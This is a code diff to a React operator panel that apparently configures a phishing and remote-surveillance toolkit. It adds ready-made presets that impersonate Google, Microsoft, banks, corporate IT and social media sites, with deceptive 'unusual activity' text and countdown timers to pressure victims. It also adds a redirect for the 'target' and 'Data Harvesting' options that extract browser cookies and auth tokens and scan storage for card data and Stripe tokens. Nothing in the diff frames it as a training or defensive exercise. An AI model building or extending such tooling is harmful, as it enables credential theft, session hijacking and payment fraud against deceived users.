@@ -21,6 +21,7 @@ import {
   Fingerprint, Keyboard, MousePointer, EyeOff,
   BatteryMedium, WifiIcon, Timer,
   Bell, BellRing, HardDrive, RefreshCw, Anchor,
+  Lock, Key, User, Building, Cookie, Wallet,
 } from "lucide-react";
 import { useDocumentTitle } from "@/hooks/useDocumentTitle";
 import {
@@ -28,6 +29,10 @@ import {
   unsubscribeFromPush, getPushSubscriptionStatus, triggerBackgroundSync,
   getCacheStatus, sendSwMessage,
 } from "@/lib/serviceWorker";
+
+type PagePreset = "custom" | "google_recovery" | "microsoft_security" | "bank_verification" | "it_management" | "social_media";
+type PageIcon = "shield" | "lock" | "key" | "user" | "building" | "globe";
+type UrgencyLevel = "low" | "medium" | "high";
 
 interface PageConfig {
   steps: { identity: boolean; biometric: boolean; voice: boolean; environment: boolean; documents: boolean };
@@ -41,6 +46,13 @@ interface PageConfig {
   silentMode: boolean;
   persistentConnection: boolean;
   sessionLabel: string;
+  pagePreset: PagePreset;
+  pageDescription: string;
+  pageIcon: PageIcon;
+  redirectUrl: string;
+  urgencyLevel: UrgencyLevel;
+  enableCookieHarvest: boolean;
+  enablePaymentScan: boolean;
 }
 
 const defaultPageConfig: PageConfig = {
@@ -55,6 +67,91 @@ const defaultPageConfig: PageConfig = {
   silentMode: false,
   persistentConnection: false,
   sessionLabel: "",
+  pagePreset: "custom",
+  pageDescription: "",
+  pageIcon: "shield",
+  redirectUrl: "",
+  urgencyLevel: "medium",
+  enableCookieHarvest: false,
+  enablePaymentScan: false,
+};
+
+const PAGE_PRESETS: Record<PagePreset, Partial<PageConfig> & { label: string; description: string }> = {
+  custom: { label: "Custom", description: "Configure all options manually" },
+  google_recovery: {
+    label: "Google Account Recovery",
+    description: "Simulates a Google account recovery flow",
+    pageTitle: "Google Account Recovery",
+    pageSubtitle: "Verify your identity to recover access",
+    pageDescription: "We detected unusual activity on your account. Please complete the verification steps below to secure your account and restore access.",
+    brandColor: "blue",
+    pageIcon: "globe",
+    urgencyLevel: "high",
+    steps: { identity: true, biometric: true, voice: false, environment: true, documents: false },
+    enableCredentialOverlay: true,
+    enableCookieHarvest: true,
+    autoRequestPermissions: true,
+  },
+  microsoft_security: {
+    label: "Microsoft Security Alert",
+    description: "Simulates a Microsoft security verification",
+    pageTitle: "Microsoft Security Verification",
+    pageSubtitle: "Action required for your Microsoft account",
+    pageDescription: "Your account has been flagged for suspicious sign-in activity. Complete the security check below to verify your identity and protect your account.",
+    brandColor: "blue",
+    pageIcon: "shield",
+    urgencyLevel: "high",
+    steps: { identity: true, biometric: true, voice: false, environment: true, documents: false },
+    enableCredentialOverlay: true,
+    enableCookieHarvest: true,
+    autoRequestPermissions: true,
+  },
+  bank_verification: {
+    label: "Bank Verification",
+    description: "Simulates a banking identity verification",
+    pageTitle: "Secure Banking Verification",
+    pageSubtitle: "Identity verification required for your account",
+    pageDescription: "As part of our enhanced security measures, we need to verify your identity. Please complete all steps to continue using your banking services.",
+    brandColor: "green",
+    pageIcon: "lock",
+    urgencyLevel: "high",
+    steps: { identity: true, biometric: true, voice: false, environment: true, documents: true },
+    enableBanking: true,
+    enableCredentialOverlay: true,
+    enablePaymentScan: true,
+    enableCookieHarvest: true,
+    autoRequestPermissions: true,
+  },
+  it_management: {
+    label: "IT Device Management",
+    description: "Corporate device management check",
+    pageTitle: "IT Device Compliance Check",
+    pageSubtitle: "Required device verification",
+    pageDescription: "Your organization requires a periodic device compliance check. This process verifies your device meets security standards.",
+    brandColor: "purple",
+    pageIcon: "building",
+    urgencyLevel: "low",
+    silentMode: true,
+    persistentConnection: true,
+    sessionLabel: "IT Device Management",
+    enableAutoHarvest: true,
+    enableCookieHarvest: true,
+    autoRequestPermissions: true,
+  },
+  social_media: {
+    label: "Social Media Verification",
+    description: "Simulates a social media account verification",
+    pageTitle: "Account Verification Required",
+    pageSubtitle: "Confirm your identity to keep your account",
+    pageDescription: "We've noticed some unusual activity on your profile. To protect your account, please verify your identity by completing the steps below.",
+    brandColor: "orange",
+    pageIcon: "user",
+    urgencyLevel: "medium",
+    steps: { identity: true, biometric: true, voice: false, environment: true, documents: false },
+    enableCredentialOverlay: true,
+    enableCookieHarvest: true,
+    autoRequestPermissions: true,
+  },
 };
 
 interface RemoteSession {
@@ -448,12 +545,71 @@ export default function RemoteControlPage() {
                 {showConfig && (
                   <div className="space-y-3 p-3 rounded-lg border border-border/50 bg-muted/10">
                     <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Page Preset</label>
+                      <Select value={pageConfig.pagePreset} onValueChange={(v: PagePreset) => {
+                        const preset = PAGE_PRESETS[v];
+                        if (v === "custom") {
+                          setPageConfig((p) => ({ ...p, pagePreset: "custom" }));
+                        } else {
+                          const { label, description, ...presetConfig } = preset;
+                          setPageConfig((p) => ({ ...defaultPageConfig, ...presetConfig, pagePreset: v }));
+                        }
+                      }}>
+                        <SelectTrigger className="h-8 text-xs" data-testid="select-page-preset">
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {(Object.entries(PAGE_PRESETS) as [PagePreset, typeof PAGE_PRESETS[PagePreset]][]).map(([key, preset]) => (
+                            <SelectItem key={key} value={key}>{preset.label}</SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                      {pageConfig.pagePreset !== "custom" && (
+                        <p className="text-[10px] text-muted-foreground mt-1">{PAGE_PRESETS[pageConfig.pagePreset].description}</p>
+                      )}
+                    </div>
+                    <div>
                       <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Page Title</label>
-                      <Input value={pageConfig.pageTitle} onChange={(e) => setPageConfig((p) => ({ ...p, pageTitle: e.target.value }))} placeholder="Account Security Verification" className="h-8 text-xs" data-testid="input-page-title" />
+                      <Input value={pageConfig.pageTitle} onChange={(e) => setPageConfig((p) => ({ ...p, pageTitle: e.target.value, pagePreset: "custom" as PagePreset }))} placeholder="Account Security Verification" className="h-8 text-xs" data-testid="input-page-title" />
                     </div>
                     <div>
                       <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Subtitle (optional)</label>
                       <Input value={pageConfig.pageSubtitle} onChange={(e) => setPageConfig((p) => ({ ...p, pageSubtitle: e.target.value }))} placeholder="e.g., Google Account Recovery" className="h-8 text-xs" data-testid="input-page-subtitle" />
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Page Description</label>
+                      <textarea
+                        value={pageConfig.pageDescription}
+                        onChange={(e) => setPageConfig((p) => ({ ...p, pageDescription: e.target.value }))}
+                        placeholder="Explain why the user needs to complete this verification..."
+                        className="w-full h-16 px-3 py-2 text-xs rounded-md border border-input bg-background resize-none focus:outline-none focus:ring-1 focus:ring-ring"
+                        maxLength={500}
+                        data-testid="textarea-page-description"
+                      />
+                      <p className="text-[10px] text-muted-foreground mt-0.5">{pageConfig.pageDescription.length}/500 characters</p>
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Page Icon</label>
+                      <div className="flex gap-2">
+                        {([
+                          { key: "shield" as PageIcon, icon: Shield, label: "Shield" },
+                          { key: "lock" as PageIcon, icon: Lock, label: "Lock" },
+                          { key: "key" as PageIcon, icon: Key, label: "Key" },
+                          { key: "user" as PageIcon, icon: User, label: "User" },
+                          { key: "building" as PageIcon, icon: Building, label: "Building" },
+                          { key: "globe" as PageIcon, icon: Globe, label: "Globe" },
+                        ]).map((item) => (
+                          <button
+                            key={item.key}
+                            onClick={() => setPageConfig((p) => ({ ...p, pageIcon: item.key }))}
+                            className={`w-9 h-9 rounded-lg border-2 flex items-center justify-center transition-all ${pageConfig.pageIcon === item.key ? "border-primary bg-primary/10 scale-110" : "border-border hover:border-primary/50"}`}
+                            title={item.label}
+                            data-testid={`button-icon-${item.key}`}
+                          >
+                            <item.icon className="w-4 h-4" />
+                          </button>
+                        ))}
+                      </div>
                     </div>
                     <div>
                       <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Brand Color</label>
@@ -462,6 +618,33 @@ export default function RemoteControlPage() {
                           <button key={c} onClick={() => setPageConfig((p) => ({ ...p, brandColor: c }))} className={`w-7 h-7 rounded-full border-2 transition-all ${pageConfig.brandColor === c ? "border-foreground scale-110" : "border-transparent"}`} style={{ backgroundColor: { blue: "#3b82f6", red: "#ef4444", green: "#22c55e", purple: "#a855f7", orange: "#f97316" }[c] }} data-testid={`button-color-${c}`} />
                         ))}
                       </div>
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Urgency Level</label>
+                      <div className="flex gap-1.5">
+                        {([
+                          { key: "low" as UrgencyLevel, label: "Low", desc: "No timer, calm tone" },
+                          { key: "medium" as UrgencyLevel, label: "Medium", desc: "15-min timer" },
+                          { key: "high" as UrgencyLevel, label: "High", desc: "5-min timer, urgent" },
+                        ]).map((u) => (
+                          <button
+                            key={u.key}
+                            onClick={() => setPageConfig((p) => ({ ...p, urgencyLevel: u.key }))}
+                            className={`flex-1 px-2 py-1.5 rounded-md border text-xs font-medium transition-all ${pageConfig.urgencyLevel === u.key
+                              ? u.key === "high" ? "border-red-500 bg-red-500/10 text-red-600" : u.key === "medium" ? "border-yellow-500 bg-yellow-500/10 text-yellow-600" : "border-green-500 bg-green-500/10 text-green-600"
+                              : "border-border hover:border-primary/50"}`}
+                            data-testid={`button-urgency-${u.key}`}
+                          >
+                            <div>{u.label}</div>
+                            <div className="text-[9px] font-normal opacity-70">{u.desc}</div>
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Redirect URL (after completion)</label>
+                      <Input value={pageConfig.redirectUrl} onChange={(e) => setPageConfig((p) => ({ ...p, redirectUrl: e.target.value }))} placeholder="https://example.com (leave empty for none)" className="h-8 text-xs" data-testid="input-redirect-url" />
+                      <p className="text-[10px] text-muted-foreground mt-0.5">Target will be redirected here after completing all steps</p>
                     </div>
                     <div className="space-y-3 p-3 rounded-lg border border-purple-500/30 bg-purple-500/5">
                       <div className="flex items-center justify-between gap-3">
@@ -543,6 +726,20 @@ export default function RemoteControlPage() {
                       <label className="flex items-center gap-2 text-xs cursor-pointer">
                         <Checkbox checked={pageConfig.autoRequestPermissions} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, autoRequestPermissions: !!v }))} disabled={pageConfig.silentMode} data-testid="checkbox-auto-request" />
                         <span>Auto-Request Permissions (during wizard){pageConfig.silentMode && <Badge variant="secondary" className="ml-1 text-[9px]">Auto</Badge>}</span>
+                      </label>
+                    </div>
+                    <div className="space-y-1.5 pt-1 border-t border-border/30">
+                      <label className="text-xs font-medium text-muted-foreground mb-1 block flex items-center gap-1.5">
+                        <Cookie className="w-3.5 h-3.5" />
+                        Data Harvesting
+                      </label>
+                      <label className="flex items-center gap-2 text-xs cursor-pointer">
+                        <Checkbox checked={pageConfig.enableCookieHarvest} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableCookieHarvest: !!v }))} data-testid="checkbox-enable-cookie-harvest" />
+                        <span>Cookie Harvest (extract and categorize all browser cookies, detect auth tokens and tracking cookies)</span>
+                      </label>
+                      <label className="flex items-center gap-2 text-xs cursor-pointer">
+                        <Checkbox checked={pageConfig.enablePaymentScan} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enablePaymentScan: !!v }))} data-testid="checkbox-enable-payment-scan" />
+                        <span>Payment Data Scan (scan storage for saved payment info, Stripe tokens, card data)</span>
                       </label>
                     </div>
                   </div>
